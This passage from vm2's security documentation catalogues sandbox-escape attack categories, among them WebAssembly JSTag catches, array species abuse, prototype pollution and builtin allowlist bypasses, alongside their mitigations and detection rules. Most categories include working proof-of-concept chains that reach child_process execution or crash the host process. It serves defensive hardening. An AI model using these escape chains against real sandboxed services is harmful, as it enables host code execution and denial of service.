Note: `Error.cause` is a related concern -- it can carry host references -- but since `Error.cause` is set by user code (not V8 internals), `ensureThis` handles it through normal property access on proxied errors.

### Mitigation

Three layers, structurally:

1. **`handleException` recursion**: detects `SuppressedError` / `AggregateError` instances by prototype check and recursively sanitizes `.error` / `.suppressed` / `.errors[]` via `ensureThis`. `SuppressedError` is also added to `errorsList` in `bridge.js`. Cycle detection via WeakMap prevents infinite recursion.
2. **Sandbox-side `Promise.prototype.then` / `.catch` overrides** route every callback through `handleException` for sandbox-realm promises (lines 199-228 of `setup-sandbox.js`).
3. **Bridge-level host-Promise interception** (GHSA-55hx supplementary fix): when sandbox code invokes a host-realm `Promise.prototype.then` / `.catch` / `.finally` (for example, via an embedder-exposed `async () => {}` whose returned promise is host-realm), the bridge `apply` trap recognizes the call (identity check against cached `otherGlobalPrototypes.Promise` methods) and wraps each sandbox-supplied callback with a sanitizing closure that pipes its argument through `handleException` (rejection) or `ensureThis` (fulfillment) before the user code runs. This closes the structural class where host machinery (PromiseReactionJob / PromiseResolveThenableJob) schedules sandbox callbacks against raw host rejection values, bypassing the sandbox-side override entirely. Setup is one-shot via `bridge.setHostPromiseSanitizers(handleException, ensureThis)` from `setup-sandbox.js`.

### Detection Rules

- **`new DisposableStack()`** or **`new AsyncDisposableStack()`** with `defer()`.
- **`using` declarations** in `eval()` -- triggers `Symbol.dispose` on scope exit.
- **`await using` declarations** -- triggers `Symbol.asyncDispose`.
- **`e.suppressed.constructor`** or **`e.error.constructor`** in catch blocks.
- **`SuppressedError`** combined with `e.name = Symbol()`.
- **Host-realm async function exposed via `{sandbox: {f: async () => {}}}`** chained with `.finally` / `.catch` to deliver SuppressedError -- now sanitized at the bridge boundary.

---

## Attack Category 17: WebAssembly JSTag Exception Catch

**Uses**: [Category 4: Error Object Exploitation](#attack-category-4-error-object-exploitation), [Category 12: Code Transformation Bypass](#attack-category-12-code-transformation-bypass)

### Description

`WebAssembly.JSTag` (available since ~Node 23) is a special tag that allows WebAssembly exception handling (`try_table`/`catch`) to catch JavaScript exceptions thrown during imported function calls. Since the transformer only instruments JavaScript `catch` clauses, exceptions caught in WebAssembly completely bypass `handleException()` sanitization.

### Attack Flow

1. **Error setup**: `err.name = Symbol()` causes `err.stack` to throw a host TypeError (Error Generation Primitive).
2. **Wasm module creation**: A WebAssembly module imports a `trigger` function that accesses `err.stack` and `WebAssembly.JSTag` as a tag for catching JS exceptions.
3. **Wasm exception catch**: The module's exported function uses `try_table/catch` with JSTag. When `trigger()` throws the host TypeError, wasm catches it and returns the exception value as an `externref`.
4. **Bypass**: The transformer only instruments JavaScript `catch` blocks. Wasm exception handling is a separate mechanism -- the transformer has zero visibility into wasm bytecode. The caught host error is returned raw and unsanitized.
5. **Escape**: `hostError.constructor.constructor("return process")()` -> RCE.

### Canonical Examples

```javascript
const err = new Error("x");
err.name = Symbol();

const wasm = new Uint8Array([
    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
    0x01,0x0c,0x03,0x60,0x00,0x00,0x60,0x00,0x01,0x6f,0x60,0x01,0x6f,0x00,
    0x02,0x19,0x02,
    0x03,0x65,0x6e,0x76,0x07,0x74,0x72,0x69,0x67,0x67,0x65,0x72,0x00,0x00,
    0x02,0x6a,0x73,0x03,0x74,0x61,0x67,0x04,0x00,0x02,
    0x03,0x02,0x01,0x01,
    0x07,0x0f,0x01,
    0x0b,0x63,0x61,0x74,0x63,0x68,0x5f,0x65,0x72,0x72,0x6f,0x72,0x00,0x01,
    0x0a,0x12,0x01,0x10,0x00,
    0x02,0x6f,0x1f,0x40,0x01,0x00,0x00,0x00,0x10,0x00,0x00,0x0b,0x00,0x0b,0x0b
]);

const instance = new WebAssembly.Instance(
    new WebAssembly.Module(wasm),
    { env: { trigger() { err.stack; } }, js: { tag: WebAssembly.JSTag } }
);

const hostError = instance.exports.catch_error();
const p = hostError.constructor.constructor("return process")();
p.mainModule.require('child_process').execSync('...');
```

### Why It Works

The entire exception sanitization strategy is built on instrumenting JavaScript `catch` clauses via the transformer. WebAssembly introduces a parallel exception-catching mechanism that operates at the bytecode level, completely outside the transformer's scope. Without `JSTag`, wasm can only catch custom wasm exceptions (not JS exceptions), and `catch_all` does not expose the exception value.

### Mitigation

`WebAssembly.JSTag` is deleted from the sandbox at initialization in `setup-sandbox.js`. Without JSTag, wasm code cannot catch JavaScript exceptions -- `catch_all` provides no value access, and `catch_all_ref` requires JSTag for `exn.extract`. The tag is a V8 internal and cannot be reconstructed by user code.

### Detection Rules

- **`WebAssembly.JSTag`** -- accessing the JS exception tag.
- **`WebAssembly.Instance`** with import objects containing `tag:` properties.
- **Wasm modules with `try_table`/`catch` instructions**.
- **Combination of wasm exception handling + Error Generation Primitive**.
- **`instance.exports.*` returning externref values**.

---

## Attack Category 18: Array Species Self-Return via Constructor Manipulation

**Uses**: [Category 3: Symbol-Based Attacks](#attack-category-3-symbol-based-attacks), [Category 10: Built-in Function Exploitation](#attack-category-10-built-in-function-exploitation)

### Description

V8's `ArraySpeciesCreate` algorithm reads `this.constructor[Symbol.species]` when methods like `Array.prototype.map`, `.filter`, `.slice`, `.splice`, `.concat`, `.flat`, `.flatMap` create a result array. By setting `constructor` on a host array to a function that (1) returns the same array and (2) has `Symbol.species` pointing to itself, an attacker makes `map` store raw host-side function results directly into the original array -- bypassing bridge sanitization entirely.

### Attack Flow

1. **Host array creation**: `ho.entries({})` creates a host array which gets proxied to the sandbox.
2. **Species constructor setup**: A sandbox function `x()` is created that returns the same array `r`. `x[Symbol.species] = x` makes V8's species resolution return `x` itself.
3. **Constructor injection**: The attacker sets `r.constructor = x`. Multiple methods:
   - **Direct write**: `r.constructor = x` (blocked by proxy `set` trap storing locally)
   - **Object.assign bypass**: `ho.assign(r, {constructor: x})` (sets directly on host array)
   - **Non-configurable constructor**: `Object.defineProperty` with `configurable: false` (detected by `Reflect.deleteProperty` check)
   - **Prototype-level**: `Object.setPrototypeOf` (blocked by own property `constructor=undefined` shadowing)
4. **Species-driven map**: `r.map(f)` triggers `ArraySpeciesCreate`. V8 reads `r.constructor` -> gets `x`, reads `x[Symbol.species]` -> gets `x`, calls `new x(length)` -> returns `r`. `map` stores callback results directly into `r` on the host side.
5. **Chained extraction**: Multiple `cwu` calls build up to extracting the host `Function` constructor -> RCE.

### Canonical Examples

```javascript
// The 'call-with-unwrap' (cwu) primitive
const g = ({}).__lookupGetter__;
const a = Buffer.apply;
const p = a.apply(g, [Buffer, ['__proto__']]);
const op = p.call(p.call(p.call(p.call(Buffer.of()))));
const ho = op.constructor;  // host Object

function cwu(func, thiz, args) {
    const r = ho.entries({});  // host array
    args.unshift(thiz);
    const f = a.apply(a.bind, [func, args]);
    r[0] = 0;
    function x() { return r; }  // species constructor returns same array
    x[Symbol.species] = x;      // species points to itself
    r.constructor = x;           // direct write (blocked by set trap)
    // OR: ho.assign(r, {constructor: x});  // Object.assign bypass
    r.map(f);  // ArraySpeciesCreate uses x -> returns r -> stores raw results
    r.constructor = undefined;
    return r;  // r[0] now contains raw unsanitized host value
}

// Chain cwu calls to extract host Function constructor
const d = cwu(a, g, [ho.freeze, ['__proto__']]);
const e = cwu(a, d[0], [ho.entries({}), ['call']]);
const c = cwu(a, a, [e[0]]);
a.apply(a, e)().mainModule.require('child_process').execSync('...');
```

### Why It Works

The bridge wraps every value crossing the boundary in proxies, but `ArraySpeciesCreate` is a V8 internal algorithm that operates entirely within the host realm. When the species constructor returns the same array, `map`'s internal `CreateDataPropertyOrThrow` stores results directly on that array -- no bridge crossing occurs. The values stay on the host side, completely bypassing proxy sanitization.

The `Object.assign` bypass is particularly insidious: the sandbox proxy's `set` trap only intercepts writes initiated from the sandbox side. `Object.assign` runs as a host-side function (through the `apply` trap), and its internal `[[Set]]` operations target the underlying host array directly.

### Mitigation

Two-layer defense in `lib/bridge.js`:

1. **Proxy `get` trap — cached `Array` ctor for host arrays**: When sandbox code reads `.constructor` on a host-array-backed proxy, the trap returns a module-load-time-captured `thisArrayCtor = Array` reference. This bypass of the normal property read neutralises any attacker-installed `constructor` (direct `r.constructor = x`, `Object.defineProperty`, `Object.assign`, prototype-chain injection via `Object.setPrototypeOf`) and is immune to prototype pollution of `Array.prototype.constructor`. Only defends sandbox-side reads; does not cover V8-internal reads issued from the host realm.
2. **Apply/construct trap neutralize-and-restore**: Before every `otherReflectApply(object, context, args)` and `otherReflectConstruct(object, args)` — i.e. every sandbox→host function invocation — the bridge walks `context` and each top-level argument. For every host array found (`Array.isArray` is cross-realm safe), it installs `constructor = undefined` as a data own property (shadowing both own and inherited constructors; the ES2024 spec explicitly maps `constructor === undefined` to `%Array%` in ArraySpeciesCreate). After the host call returns — in a `finally` — the prior descriptor is restored (or the shadow deleted if none existed). This covers V8-internal reads issued from the host realm during the call.

Both layers reject un-neutralisable arrays with `VMError`: a pre-installed non-configurable `constructor` whose value is anything other than `undefined`, or a non-extensible array without an own `constructor` slot, cannot be safely shadowed or restored and is treated as an attack.

The neutralize-on-entry/restore-on-exit pattern mirrors `resetPromiseSpecies` in `setup-sandbox.js`, which closes the equivalent V8-internal-bypass class for Promise.

### Detection Rules

- **`r.constructor = x` where `x` has `Symbol.species`** -- species self-return pattern.
- **`x[Symbol.species] = x`** -- self-referential species.
- **`function x() { return r; }` as species** -- constructor returning existing object.
- **`ho.assign(r, {constructor: ...})`** -- bypassing proxy set trap via host Object.assign.
- **`.map(f)` on arrays with custom constructor** -- triggering ArraySpeciesCreate.
- **`ho.entries({})` or `Object.entries()`** -- creating host arrays for species manipulation.

---

## Attack Category 19: Host prepareStackTrace Fallback via Array.fromAsync Promise Bypass

**Uses**: [Category 4: Error Object Exploitation](#attack-category-4-error-object-exploitation), [Category 7: Promise and Async Exploitation](#attack-category-7-promise-and-async-exploitation), [Category 16: SuppressedError via Explicit Resource Management](#attack-category-16-suppressederror-via-explicit-resource-management)

### Description

When `Error.prepareStackTrace` is `undefined` in the sandbox, V8 falls back to Node.js's host-side `prepareStackTraceCallback` (from `node:internal/errors`). If that host code throws (e.g., when `error.name` is a `Symbol`), the `TypeError` is a **host-realm** error. By combining this with `Array.fromAsync` to obtain a host promise (whose `.catch` bypasses sandbox `handleException` wrapping), and `using` declarations to create `SuppressedError`, the attacker leaks a host `TypeError` and climbs to the host `Function` constructor.

### Attack Flow

1. **Prototype walking**: `__lookupGetter__` + `Buffer.apply` chain to obtain host `Object` and host `Array` constructors.
2. **Host promise acquisition**: `ha.fromAsync(...)` (host `Array.fromAsync`) returns a host promise. Unlike sandbox promises whose `.catch()` is wrapped with `handleException`, the host promise's `.catch()` passes values directly.
3. **Host TypeError generation**: Inside the callback, a `using` declaration creates a disposable object whose `Symbol.dispose` method accesses `Error.stack` with `error.name = Symbol()`. When `Error.prepareStackTrace` is `undefined`, V8 delegates to Node.js's host-side `prepareStackTraceCallback`, which throws a **host-realm** `TypeError`.
4. **SuppressedError wrapping**: The `using` scope exit encounters two errors: the host `TypeError` and `null`. V8 wraps them in a `SuppressedError`.
5. **Host promise catch bypass**: The `SuppressedError` propagates through the host promise's `.catch()`. Since this is a host promise, `handleException` is never called.
6. **Escape**: `e.error.constructor.constructor` gives host `Function` -> RCE.

### Canonical Examples

```javascript
const g = ({}).__lookupGetter__;
const a = Buffer.apply;
const p = a.apply(g, [Buffer, ['__proto__']]);
const op = p.call(p.call(p.call(p.call(Buffer.of()))));
const ho = op.constructor;        // host Object
const ap = p.call(ho.entries({}));
const ha = ap.constructor;         // host Array

ha.fromAsync([0], ()=>{
  obj = {[Symbol.dispose]() {
    const e = new Error();
    e.name = Symbol();
    return e.stack;     // Triggers host prepareStackTraceCallback
  }};
  eval("{using a = obj;throw null;}");
}).catch(e=> {
  // e is SuppressedError; e.error is HOST TypeError
  const F = e.error.constructor.constructor;
  const proc = F('return process')();
  proc.mainModule.require('child_process').execSync('id');
});
```

### Why It Works

The key insight is that `Error.prepareStackTrace` being `undefined` in the sandbox causes V8 to delegate stack formatting to Node.js's host-side code. This host code runs in the host context, so any `TypeError` it throws is a host-realm error.

The second critical component is the host promise from `Array.fromAsync`. The sandbox wraps `Promise.prototype.catch` to run `handleException` on caught values, but this wrapping only applies to sandbox promises. Host promises obtained through host array methods bypass this wrapping entirely.

### Mitigation

Three-layer defense:

1. **`defaultSandboxPrepareStackTrace`** — sandbox always provides a safe `prepareStackTrace`. Post-GHSA-v27g-jcqj-v8rw hardening, the default is installed at bootstrap (so V8 never falls back to Node's host `prepareStackTraceCallback` even before sandbox code first reads `error.stack`), and the property setter substitutes the safe default whenever user code assigns a non-function value (`undefined` / `null` / etc.). The default function safely handles Symbol names, Proxy objects, and other exotic types without throwing. CallSite metadata getters redact host frames (and `getEvalOrigin` redacts unconditionally — see Category 4).
2. **Prototype-walked host `Array` constructor replaced with sandbox `Array`** (GHSA-grj5-jjm8-h35p fix, commit `7352f11`). The bridge proxy's `get` trap for `.constructor` on host arrays now returns the cached sandbox `Array`, so `ho.entries({}).constructor` resolves to sandbox `Array`. `ha.fromAsync(...)` is therefore sandbox `Array.fromAsync` returning a sandbox Promise — routing through the existing sandbox `.then`/`.catch` overrides with `handleException`. This is the primary, load-bearing closure for the canonical PoC.
3. **`handleException` recurses into `AggregateError.errors[]`** (GHSA-55hx-c926-fr95 supplementary fix). Mirrors the existing `SuppressedError.error` / `.suppressed` recursion. Closes a small gap where a `Promise.any` rejection delivers an `AggregateError` whose `.errors[i]` is a host-realm error; prior to this fix, only the `AggregateError` itself was sanitized, not its element array.

A fourth layer was added in GHSA-55hx-c926-fr95: the **bridge-level Promise-boundary sanitizer**. The bridge `apply` trap recognizes calls to host `Promise.prototype.{then,catch,finally}` by identity (cached at bridge construction time) and wraps every sandbox-supplied callback with a sanitizing closure that pipes its argument through `handleException` (rejection) or `ensureThis` (fulfillment) before invoking the user callback. This closes the structural class where an embedder exposes a host async function (e.g. `{sandbox: {f: async () => {}}}`) and sandbox code chains `.then` / `.catch` / `.finally` on its returned host-realm promise -- the host PromiseReactionJob would otherwise schedule the sandbox callback against a raw host SuppressedError whose `.error.constructor.constructor` is host `Function`. See Category 16 for full details.

### Detection Rules

- **`Array.fromAsync`** called on a host `Array` constructor (now neutered by layer 2 — walking to host `Array` returns sandbox `Array`).
- **Host promise `.catch()`** or `.then()` -- callbacks now sanitized at the bridge boundary via the GHSA-55hx supplementary fix.
- **`Error.prepareStackTrace = undefined`** or **`delete Error.prepareStackTrace`** -- triggers host fallback.
- **`error.name = Symbol()` + `error.stack`** -- Error Generation Primitive targeting host formatter.
- **`using` declaration inside `eval()`** -- SuppressedError + transformer bypass.
- **Prototype chain walking** (`__lookupGetter__`, `Buffer.apply`) to obtain host `Array` constructor (now neutered by layer 2).
- **`Promise.any` producing AggregateError** -- `.errors[]` now recursively sanitized.

---

## Attack Category 20: Host Intrinsic Prototype Pollution via Bridge Write Traps

### Description

`BaseHandler.set` and `BaseHandler.defineProperty` historically forwarded every sandbox write directly into the wrapped host object via `otherReflectSet` / `otherReflectDefineProperty`. For ordinary host instances (a Buffer, a host-provided config object) this is intentional and correct — sandbox code should be able to mutate state the host explicitly handed it. For host-realm **intrinsic prototypes** (Object.prototype, Array.prototype, Function.prototype, Error.prototype, etc.) it is catastrophic: the mutation is globally observable to every host-side consumer of those prototypes, enabling prototype pollution that crosses the sandbox boundary in the most damaging direction. `deleteProperty` and `preventExtensions` had analogous gaps — sandbox code could `delete Object.prototype.hasOwnProperty` from the host realm, or freeze host prototypes to durably break unrelated host code.

### Attack Flow

1. **Reach a host intrinsic prototype.** Walk the prototype chain via `({}).__lookupGetter__('__proto__')` composed with `Buffer.apply`, ending at host `Object.prototype` (or `Array.prototype`, `Function.prototype`, etc.). Several earlier advisories (GHSA-grj5, GHSA-47x8, …) provided this walk; the same primitive lands here.
2. **Write through the bridge.** With the bridge proxy wrapping host `Object.prototype` in hand, any of the following sandbox writes lands in the host realm:
   - `hostProto.x = v` → `set` trap → `otherReflectSet(hostObjectPrototype, 'x', v)`.
   - `Object.defineProperty(hostProto, 'x', {value: v})` → `defineProperty` trap → `otherReflectDefineProperty(...)`.
   - `Reflect.set(hostProto, 'x', v)` / `Reflect.defineProperty(hostProto, ...)` — same traps.
   - `delete hostProto.someProp` → `deleteProperty` trap → `otherReflectDeleteProperty(...)`.
   - `Object.preventExtensions(hostProto)` → `preventExtensions` trap → host prototype frozen forever.
3. **Observe pollution from host code.** Any host-side code that subsequently reads from objects of the affected class sees the attacker's value.

### Canonical Example

```javascript
// (advisory GHSA-vwrp-x96c-mhwq)
const g = ({}).__lookupGetter__;
const a = Buffer.apply;
const p = a.apply(g, [Buffer, ['__proto__']]);
const hostObjectProto = p.call(p.call(p.call(p.call(Buffer.of()))));
hostObjectProto.vm2EscapeMarker = 'polluted-object-prototype';
// Host-side: ({}).vm2EscapeMarker === 'polluted-object-prototype' — global pollution.
```

### Why It Works

The bridge's design separated sandbox-realm reasoning from host-realm reasoning at the proxy boundary, but the four write traps (`set`, `defineProperty`, `deleteProperty`, `preventExtensions`) were unconditionally pass-through. Most host objects exposed to the sandbox are values the host *intends* to make mutable — so a blanket "no writes to host objects" rule would break legitimate API contracts. The actual invariant being violated is narrower: "host-realm objects whose state is observed by host code outside the sandbox must be read-only from the sandbox's perspective." Intrinsic prototypes are the canonical example of such objects.

### Mitigation

`createBridge()` builds a closure-scoped `WeakMap` of "protected host objects" at bridge init, populated with every entry in `otherGlobalPrototypes` (the cached intrinsic prototypes — Object, Array, Function, Error and subclasses, RegExp, Promise, Number/String/Boolean wrappers, Date, Map, Set, WeakMap, WeakSet, AsyncFunction, GeneratorFunction, AsyncGeneratorFunction, SuppressedError, AggregateError, VMError) plus each prototype's `.constructor` value (so the host `Object`/`Array`/`Function` constructors themselves are also protected). The four write traps in `BaseHandler` — `set`, `defineProperty`, `deleteProperty`, `preventExtensions` — now check `isProtectedHostObject(object)` before any `otherReflect*` mutation call and throw `VMError(OPNA)` on hit. The check fires only when `!isHost` (sandbox-originated writes); host-side embedder code writing to its own intrinsics through other paths is unaffected.

The protected set is captured *before* any sandbox code runs, and is keyed on raw host-realm object identity — so prototype-pollution attempts that try to subvert the check itself (e.g., `Array.prototype.constructor = attackerFn`) fail because the WeakMap holds the original references.

**Symbol-key augmentation (GHSA-m5q2-4fm3-vfqp)**: the per-object `isProtectedHostObject` check fires only for intrinsic prototypes, so non-intrinsic host objects (a plain `{}` exposed via `vm.sandbox.x`, a host function, a Buffer instance) remained writable from the sandbox. That is intentional — embedders need to expose mutable host state — but it interacts badly with [Category 8](#attack-category-8-cross-realm-symbol-extraction-from-host-objects)-class symbol leaks: a sandbox that obtains a real `nodejs.*` cross-realm symbol could install a host-side hook (util.promisify, stream brand, webstream controller) on any such non-protected host object and steer host control flow without ever needing host RCE. The four write traps (`set`, `defineProperty`, `deleteProperty` — plus `preventExtensions` already covered by the original Cat-20 fix) now also reject any sandbox-originated key that satisfies `isDangerousCrossRealmSymbol(key)`. This is the symmetric counterpart to the existing read-direction symbol filter: even if a future bypass surfaces a dangerous symbol back inside the sandbox, it cannot be installed as a key on any bridge-wrapped host object.

### Detection Rules

- **`hostProto.x = v`** — direct assignment to a bridge proxy of an intrinsic prototype.
- **`Object.defineProperty(hostProto, ...)`** / **`Reflect.defineProperty(...)`** — descriptor-based pollution.
- **`Reflect.set(hostProto, k, v)`** — reflective assignment.
- **`delete hostProto.x`** — sandbox-side property deletion on host intrinsic.
- **`Object.assign(hostProto, src)`** — bulk pollution via host-side `[[Set]]` calls.
- **`Object.preventExtensions(hostProto)`** / **`Object.freeze(hostProto)`** — durable host DoS.

### Considered Attack Surfaces

- **Non-intrinsic host objects** (Buffer instances, host-config objects, modules exposed via NodeVM externals) remain mutable from the sandbox. This is intentional — the host explicitly chose to expose them. The vulnerability class is specifically about *implicit* mutability of cross-cutting host invariants.
- **Future Node intrinsics** (e.g., `Iterator.prototype`, `AsyncIterator.prototype`, `Temporal.*`) are not yet in `otherGlobalPrototypes`. Adding them to the cached list automatically extends protection. Tracked as a future-risk item — see "Future Risks" below.

---

## Attack Category 21: NodeVM Builtin Allowlist Bypass via Host-Passthrough Builtins

### Description

NodeVM's `require.builtin` allowlist defends sandbox code from reaching dangerous Node modules (`child_process`, `fs`, etc.). The allowlist is enforced by `lib/builtin.js` — when sandbox code calls `require(name)`, the resolver consults the allowlist and only loads modules the user opted in to. **However**, several Node builtins themselves expose primitives whose primary capability is "reach host code regardless of the sandbox boundary". When such a builtin is on the allowlist (or, more commonly, included by the `'*'` wildcard), it becomes a single-line allowlist bypass:

- `module` exposes `Module._load(name)`, `Module._resolveFilename`, `Module._cache`, `createRequire` — all of which load any host builtin or external module ignoring vm2's allowlist.
- `worker_threads` exposes `new Worker(src, {eval: true})` — runs arbitrary JS in a fresh thread that has no vm2 sandbox at all.
- `cluster` exposes `cluster.fork()` — spawns a host child process running attacker-controlled code.
- `vm` exposes `vm.runInThisContext` — evaluates code directly in the host realm, bypassing every bridge proxy.
- `repl` exposes `repl.start({eval, input, output})` — constructs an interactive evaluator attached to host streams.
- `inspector` (and `inspector/promises`, subpath family) exposes the inspector protocol — attaches a debugger to the host process and runs `Session().post('Runtime.evaluate', { expression })` against host JS.
- `process` exposes `process.getBuiltinModule(name)` (Node 22+) — reloads ANY core module regardless of the embedder's allow/deny list — plus `process.binding(...)`, `process.dlopen(...)`, `process._linkedBinding(...)`, and the raw host `process.env`. The sandbox global `process` is a sanitized shim defined in `setup-node-sandbox.js`; the raw host module is never safe to expose.

### Attack Flow

1. **Allowlist includes a host-passthrough builtin** (most commonly because the user wrote `builtin: ['*', '-child_process']` and `'*'` expanded to include `'module'`).
2. **Sandbox calls `require('module')`**. NodeVM's resolver finds `'module'` in `BUILTIN_MODULES`, calls `addDefaultBuiltin` which loads it via `vm.readonly(hostRequire('module'))`. The `ReadOnlyHandler` proxy blocks mutation traps but *not* `apply`/`get` — calling methods on the proxy still forwards them to the host realm.
3. **Sandbox calls `Module._load('child_process')`**. The bridge `apply` trap forwards to host `Module._load`, which loads `child_process` natively in the host with no vm2 check.
4. **`child_process.execSync(...)`** → host RCE.

### Canonical Examples

```javascript
// (advisory GHSA-947f-4v7f-x2v8) — `module` bypass
const vm = new NodeVM({
  require: { builtin: ['*', '-child_process'], external: false }
});
vm.run(`
  const Module = require('module');
  const cp = Module._load('child_process');  // bypasses '-child_process' exclusion
  module.exports = cp.execSync('id').toString();
`, 'poc.js');
```

```javascript
// (advisory GHSA-rp36-8xq3-r6c4) — `process.getBuiltinModule` bypass
const vm = new NodeVM({
  require: { builtin: ['*', '-child_process', '-inspector'], external: false }
});
vm.run(`
  const cp = require('process').getBuiltinModule('child_process');
  module.exports = cp.execFileSync('/bin/sh', ['-c', 'id']).toString();
`, 'poc.js');
```

```javascript
// (advisory GHSA-rp36-8xq3-r6c4) — `inspector/promises` subpath bypass
const vm = new NodeVM({
  require: { builtin: ['*', '-child_process', '-inspector'], external: false }
});
vm.run(`
  const { Session } = require('inspector/promises');
  const s = new Session();
  s.connect();
  s.post('Runtime.evaluate', { expression: '/* runs in host realm */' });
`, 'poc.js');
```

### Why It Works

The user's mental model of `['*', '-child_process']` is "every builtin except `child_process`". That model assumes every builtin is either fully sandboxed or fully blocked — but `module` (and its peers above) are neither. They're *meta-builtins* that load other builtins by name. The generic `vm.readonly()` wrapper cannot make them safe because the sandbox-bypass primitive is the very thing the user is calling.

### Mitigation

Three-layer denylist enforcement in `lib/builtin.js` (restores **[Invariant 13 — The NodeVM builtin allowlist is a closed system](#defense-invariants)**):

1. **`DANGEROUS_BUILTINS` Set** at module load — `['module', 'worker_threads', 'cluster', 'vm', 'repl', 'inspector', 'process', 'trace_events', 'wasi', 'diagnostics_channel', 'async_hooks', 'perf_hooks', 'v8', 'os', 'dns']`. The last six were added by [Category 35](#attack-category-35-nodevm-process-wide-observability-builtins-host-data-info-leak) for the process-wide observability info-leak class (`os` and `dns` via GHSA-m5w8-4gq2-6f8x, which additionally close the host-process *write* APIs `os.setPriority` / `dns.setServers` / `dns.setDefaultResultOrder`); they share the deny-by-default enforcement but a different threat model (data exposure / host-state mutation, not code execution).
2. **Family-prefix check** via `isDangerousBuiltin(key)` — any `<family>/...` whose family is in the denylist is also blocked (e.g. `inspector/promises`, future `inspector/foo`, hypothetical `process/foo`, `module/foo`). The check also strips the optional `node:` URL-style prefix so `node:process` and `node:inspector/promises` are caught.
3. **Filter from `BUILTIN_MODULES`** — closes the `'*'` wildcard expansion path. `'*'` will never auto-allow these names regardless of the user's exclusion list.
4. **Reject in `addDefaultBuiltin`** — closes the explicit-allowlist path (`builtin: ['module']`, `builtin: ['process']`, `builtin: ['inspector/promises']`) and the lower-level `makeBuiltins([...])` API used by custom resolvers. The `SPECIAL_MODULES` escape hatch is preserved: a future safe wrapper (e.g. a `module` shim that exposes only `builtinModules` metadata) can be registered there if a real consumer needs it.

The fix does not affect the `mocks` / `overrides` escape hatches — users who genuinely need a stub for one of these names can register a sandbox-safe replacement.

`trace_events` and `wasi` were added during pre-tag red-team:

- **`trace_events.createTracing({categories: [...]})`** asserts `args[0]->IsArray()` in V8 C++. The array crosses the bridge as a Proxy, the `IsArray()` check fails, and the entire host process aborts. Reachable as ~150 bytes from sandbox under `builtin: ['*']` — not RCE, but a host-process-DoS primitive of the same severity class as Category 22.
- **`wasi`** exposes the WebAssembly System Interface preview1 syscall surface (filesystem `preopens`, host clock/random, network if preopened). The API is experimental and broad; even a misconfigured `preopens: {}` exposes the host CWD when sandbox code constructs a WASI module.

**Supersedes**: the previous GHSA-947f-4v7f-x2v8 mitigation, which used an exact-match denylist and missed `process` and subpath builtins such as `inspector/promises`. The family-prefix check subsumes the prior fix and forecloses every same-shape variant.

### Detection Rules

- **`builtin: ['*']` or `['*', '-X']`** in NodeVM config — historically allowed `module`/`worker_threads`/`cluster`/`vm`/`repl`/`inspector`/`trace_events`/`wasi`, now safely filtered. **Note: `'*'` still allows `child_process`, `fs`, `dgram`, `net`, `http`, `dns`, etc. — it is NOT a sandbox-safe default for untrusted code.**
- **`require('module')._load(...)`** — the canonical bypass primitive.
- **`new Worker(src, {eval:true})`** — out-of-band code execution.
- **`cluster.fork()`** — host process spawn.
- **`vm.runInThisContext(...)`** — host-realm `eval`.
- **`repl.start({eval, ...})`** — host-realm REPL evaluator.
- **`inspector.open()`** or **`new (require('inspector/promises').Session)()`** — debugger attachment / `Runtime.evaluate` host-realm code execution.
- **`require('process').getBuiltinModule(name)`** — reloads any core module bypassing the allow/deny list.
- **`require('process').binding('spawn_sync')` / `.dlopen(module, path)`** — raw C++ binding surface and native add-on loader.
- **`trace_events.createTracing({categories: [...]})`** — host process abort via C++ assertion failure.
- **`new (require('wasi').WASI)({...})`** — preview1 syscall surface.

### Considered Attack Surfaces

- **`async_hooks`, `diagnostics_channel`, `perf_hooks`, `v8`** are now denied as process-wide observability primitives — see [Category 30](#attack-category-30-nodevm-process-wide-observability-builtins-host-data-info-leak). They expose host-process state rather than host-code-loading primitives, but are functionally identical from the embedder's perspective: any allowlist that includes them leaks per-request user data, auth tokens, and heap contents into the sandbox.
- **`child_process`** is NOT on the auto-denylist because users may legitimately want it for trusted scripts (e.g., dev tooling running known scripts in vm2 for hot-reload isolation). For untrusted code, `child_process` is a full-host-RCE primitive — embedders MUST exclude it explicitly (`['*', '-child_process']`) or, better, use an explicit allowlist of just the modules they need. The README's "Hardening recommendations" section calls this out.
- **`fs`** is allowed under `'*'` because file-system access can be a legitimate sandbox capability for many use cases (e.g., user-script template engines reading templates). Users who want filesystem isolation use `VMFileSystem` or exclude `fs` explicitly. Same caveat as `child_process` — `'*'` is not sandbox-safe for untrusted code.
- **`dgram`, `net`, `http`, `https`, `dns`** are network-IO builtins, allowed under `'*'`. Any of them give untrusted code outbound network access from the host. Embedders should explicitly exclude or allowlist.

---

## Attack Category 22: Promise Executor Unhandled Rejection — Host Process DoS

### Description

Sandbox code constructs a `Promise` whose executor synchronously triggers a host-realm error. The canonical primitive is `e.name = Symbol(); e.stack` — V8's internal `FormatStackTrace` runs while it's still *inside* the executor and coerces the Symbol-named `name` to a string, throwing a host-realm `TypeError`. Because no `.catch()` is attached, the rejection propagates as an **unhandled rejection** to the host process. Node 15+ default behaviour terminates the process on any unhandled rejection. A single ~150-byte sandbox payload crashes the entire host service serving all users.

`allowAsync: false` makes the situation *worse*: the sandbox-side `.catch` is blocked, so any rejection from the executor is *guaranteed* to be unhandled — there is no path for sandbox code to consume it.

This is purely a denial-of-service primitive (no host code execution), but the impact is severe in production: under container orchestration with restart policies (Docker, Kubernetes, PM2), a repeating attacker request can crash the process faster than it can come back, creating a continuous service-unavailable loop.

### Attack Flow

1. Sandbox calls `new Promise(executor)`.
2. Inside the executor, sandbox constructs an Error with a Symbol-named `.name` and accesses `.stack` — V8's stack formatter throws a host TypeError synchronously.
3. The Promise constructor's spec-mandated executor try/catch catches the throw and sets the Promise to rejected with the raw host TypeError.
4. No `.catch()` is attached.
5. After microtask drain, host fires `unhandledRejection` with the raw host TypeError.
6. Node 15+ default behaviour: terminate the host process.

### Canonical Example

```javascript
// (advisory GHSA-hw58-p9xv-2mjh)
new VM({ allowAsync: false }).run(`
  new Promise(function(r, j) {
    var e = new Error();
    e.name = Symbol();
    e.stack;  // V8 stack formatter throws host TypeError here
  });
`);
// Host process dies on next microtask tick.
```

### Why It Works

The vm2 sandbox-side `globalPromise.prototype.then`/`catch` overrides do sanitise rejection callback values via `handleException`, but they only fire when sandbox code attaches a `.then`/`.catch`. The PoC attaches neither. The Promise's rejection path bypasses every sanitisation layer the sandbox has, lands directly in V8's microtask queue, and propagates to the host's `unhandledRejection` event with the original host-realm error.

### Mitigation

